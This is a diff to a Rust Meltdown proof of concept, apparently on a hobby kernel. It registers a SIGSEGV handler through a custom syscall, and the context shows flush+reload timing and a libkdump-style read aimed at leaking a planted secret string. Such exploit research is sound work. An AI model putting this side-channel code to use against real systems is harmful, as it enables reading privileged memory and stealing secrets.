@@ -9,6 +9,9 @@ use alloc::vec::Vec;
 use core::{ptr, mem};
 use alloc::alloc::{alloc, dealloc, handle_alloc_error, Layout};
 use signal::signal_vector::SignalVector;
+use signal::signal_handler::SignalHandler;
+use syscall;
+use syscall::SystemCall::SignalHandlerRegister;
 
 use core::arch::asm;
 
@@ -83,8 +86,19 @@ pub fn flush_reload(cache_miss_threshold: u64, pointer: *const MemoryPage) -> bo
     end_time - start_time < cache_miss_threshold
 }
 
+struct SegfaultHandler {
+	
+}
+
+impl SignalHandler for SegfaultHandler {
+	fn trigger(&self) {
+		println!("Signal handler triggered!");
+	}
+}
+
+// Debugging only
 pub fn handle_signal() {
-	println!("Handling signal...");
+	println!("Handling signal. This means we successfully jumped back into userspace!");
 }
 
 pub fn libkdump_read_signal_handler(config: &Config, cache_miss_threshold: u64, mem: &[MemoryPage], pointer: *const u8) -> usize {
@@ -162,7 +176,8 @@ pub fn detect_flush_reload_threshold(pointer: *const MemoryPage) -> u64{
 #[unsafe(no_mangle)]
 pub fn main() {
     println!("Meltdown start\n");
-    println!("Address of handle_signal: {:x}", handle_signal as u64);
+    println!("Address of handle_signal is {:x}", handle_signal as u64);
+    syscall::syscall(SignalHandlerRegister, &[SignalVector::SIGSEGV as usize, handle_signal as usize]);
     const ARRAY_SIZE: usize = 256; // 256 entries, each containing 256 u128's, meaning 256*4K
     const SECRET: &str = "Whoever reads this is dumb.";
     let default_config = Config {
